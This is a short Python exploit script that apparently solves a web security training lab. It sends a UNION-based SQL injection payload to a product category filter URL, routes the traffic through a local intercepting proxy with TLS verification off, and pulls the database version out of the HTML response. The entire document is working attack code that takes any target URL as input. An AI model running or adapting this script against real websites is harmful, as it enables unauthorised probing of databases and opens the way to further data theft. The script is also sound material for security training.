import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_database_version(url):
    path = '/filter?category=Accessories'
    sql_payload = "' UNION select @@version, NULL%23"       #Remember to URL-Encode characters that might get filtered out e.g. #
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))

    if version is None:
        return False

    else:
        print("[+] The database version is: %s" %version)
        return True

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Determining the database type and version...")

    if not exploit_sqli_database_version(url):
        print("[-] Could not determine database type and version.")
